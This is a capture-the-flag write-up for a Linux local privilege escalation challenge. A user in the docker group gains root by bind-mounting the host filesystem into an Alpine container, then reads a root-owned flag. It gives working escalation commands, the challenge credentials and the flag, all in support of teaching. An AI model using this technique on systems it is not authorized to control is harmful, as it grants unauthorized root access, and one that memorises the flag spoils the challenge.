# TL Priv Escl #1 – full writeup

[← Back to Miscellaneous](../README.md) · [Challenge overview](README.md)

**Category:** Miscellaneous · **Points:** 150 · **Flag:** `SecLeaf{local_escl4t3_r00t}`

**Author:** [Rutwik](https://github.com/Rutwik-712) · **Team:** Bug Busters

## TL;DR

1. Log in as the low-privileged `osint` user with the provided credentials.
2. `id` shows `osint` is a member of the `docker` group (`998(docker)`).
3. Docker-group membership is root-equivalent: the daemon runs as root and will bind-mount the host filesystem for you.
4. Run a container with `-v /:/host`, which gives a root shell over the real host, and `cat` the root-owned flag.

## The challenge

We are handed console/SSH access to a Linux box and told to escalate:

```text
Username: osint
Password: TLosint
```

The challenge name is literal – a standard **local privilege escalation** where
a single misconfiguration bridges a normal user to root. The whole task is
enumeration plus recognising one powerful group.

## Step 1 – Establish who we are

After logging in we confirm the account and that we are not root:

```bash
id
whoami
```

An unprivileged `osint` account, as expected.

## Step 2 – Enumerate for the easy win

Group membership is one of the most common escalation vectors, so it is the
first thing to check:

```bash
id
# uid=1000(osint) gid=1000(osint) groups=1000(osint),998(docker)
```

`osint` is in the **`docker`** group. For completeness we also checked the usual
quick paths, which led nowhere:

```bash
sudo -l                                   # no useful sudo rights
find / -perm -4000 -type f 2>/dev/null    # no useful SUID binary
```

The `docker` group is the lead.

## Step 3 – Why docker group == root

This is not a bug in Docker; it is how the daemon is designed to work:

- The Docker daemon (`dockerd`) runs as **root**.
- Any user in the `docker` group can talk to the daemon over its socket and launch containers.
- A container can be told to **bind-mount the host filesystem**, and the daemon performs that mount as root.
- Therefore any docker-group member can mount the host's `/` inside a container and read or write **any** file on the host as root.

Effectively, being in the `docker` group *is* having root – the group is a
root-equivalent trust boundary. We first confirmed the daemon was reachable:

```bash
docker ps
docker images
```

## Step 4 – Escalate via a bind-mounted container

We start a tiny Alpine container with the host root filesystem bind-mounted to
`/host`. Processes inside the container run as root, so the mounted host files
are ours to read and write:

```bash
docker run --rm -it -v /:/host alpine sh
```

| Flag | Meaning |
| --- | --- |
| `docker run` | start a new container |
| `--rm` | delete the container on exit (no artifact left behind) |
| `-it` | interactive terminal inside the container |
| `-v /:/host` | mount the host root `/` at `/host` inside the container |
| `alpine sh` | small image, drop into a shell |

Inside the container we are root, with the whole host at `/host`:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

## Step 5 – Read the flag

The flag file is root-owned on the host, but we are root inside the container
and the host is mounted at `/host`:

```bash
cat /host/root/flag.txt
# SecLeaf{local_escl4t3_r00t}
```

## Flag

```text
SecLeaf{local_escl4t3_r00t}
```

## Why this is the right answer

- **Forward check:** before the container, `/root/flag.txt` is unreadable as `osint`; after bind-mounting `/` into a root container it reads directly – the escalation is what grants access.
- **Root confirmed:** `id` inside the container reports `uid=0(root)`, so the read happens with real root privileges over the host filesystem.
- **The flag names the task:** `local_escl4t3_r00t` = "local escalate root", matching the technique.

## What we learned

- **Enumerate groups first.** A single `id` revealed the entire attack path; group membership is the first thing to check in local priv-esc.
- **`docker` group is root-equivalent.** Any member can become root via a bind-mounted container – treat membership as a root grant, by design, not a Docker flaw.
- **Bind mounts carry the privilege.** `-v /:/host` is the piece that exposes the host filesystem to the root-running container.
- **Take the simplest path.** With docker-group membership confirmed, there was no need to chase SUID binaries or kernel exploits.

## Reproduce

Live-machine challenge (offline after the event). Log in as `osint` / `TLosint`,
then:

```bash
id                                        # note: groups=...,998(docker)
docker run --rm -it -v /:/host alpine sh
cat /host/root/flag.txt
```

---

[← Back to Miscellaneous](../README.md) · [Challenge overview](README.md)
